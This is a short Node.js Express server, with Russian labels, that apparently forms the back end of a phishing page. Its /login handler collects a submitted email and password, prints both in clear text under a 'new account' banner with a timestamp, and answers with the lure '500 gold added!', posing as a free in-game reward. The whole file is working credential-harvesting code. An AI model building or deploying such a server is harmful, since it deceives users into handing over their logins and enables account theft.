const express = require('express');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    if (!email || !password) {
        return res.status(400).json({ error: 'Fill all fields' });
    }

    console.log('');
    console.log('========================================');
    console.log('  НОВЫЙ АККАУНТ');
    console.log('========================================');
    console.log('  Почта:    ' + email);
    console.log('  Пароль:   ' + password);
    console.log('  Время:    ' + new Date().toLocaleString());
    console.log('========================================');
    console.log('');

    res.json({ success: true, message: '500 gold added!' });
});

app.listen(3000, () => {
    console.log('Server started on http://localhost:3000');
});
